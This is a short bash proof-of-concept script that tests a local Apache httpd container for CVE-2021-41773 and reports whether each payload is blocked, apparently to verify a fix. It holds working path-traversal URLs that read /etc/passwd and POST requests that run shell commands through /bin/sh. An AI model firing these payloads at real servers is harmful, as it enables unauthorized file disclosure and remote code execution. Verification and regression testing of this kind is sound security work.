#!/usr/bin/env bash
# Probe CVE-2021-41773 against a running httpd container.
# Usage: ./poc.sh [base-url]   (default http://127.0.0.1:8080)
# Exit 0 when every payload is blocked, 1 when any payload leaks data.
set -u
base="${1:-http://127.0.0.1:8080}"
fail=0

check_blocked () {
  local name="$1" url="$2" data="${3:-}"
  local out
  if [ -n "$data" ]; then
    out=$(curl --path-as-is -s -m 10 -o - -w '\n%{http_code}' -X POST --data "$data" "$url" 2>/dev/null)
  else
    out=$(curl --path-as-is -s -m 10 -o - -w '\n%{http_code}' "$url" 2>/dev/null)
  fi
  local code body
  code=$(printf '%s' "$out" | tail -n1)
  body=$(printf '%s' "$out" | sed '$d')

  if printf '%s' "$body" | grep -qE 'root:.*:0:0:|uid=[0-9]+\(.*\) gid='; then
    printf '[VULNERABLE] %-28s HTTP %s — payload executed\n' "$name" "$code"
    fail=1
  else
    printf '[blocked]    %-28s HTTP %s\n' "$name" "$code"
  fi
}

echo "Target: $base"
check_blocked "traversal /etc/passwd"  "$base/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
check_blocked "double-encoded passwd"  "$base/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
check_blocked "RCE via /bin/sh id"     "$base/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" "echo Content-Type: text/plain; echo; id"
check_blocked "RCE echo marker"        "$base/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" "echo Content-Type: text/plain; echo; echo PWNED_MARKER"

echo "----"
if [ "$fail" -eq 0 ]; then
  echo "RESULT: all payloads blocked (fix verified)"
else
  echo "RESULT: at least one payload succeeded (vulnerable)"
fi
exit "$fail"
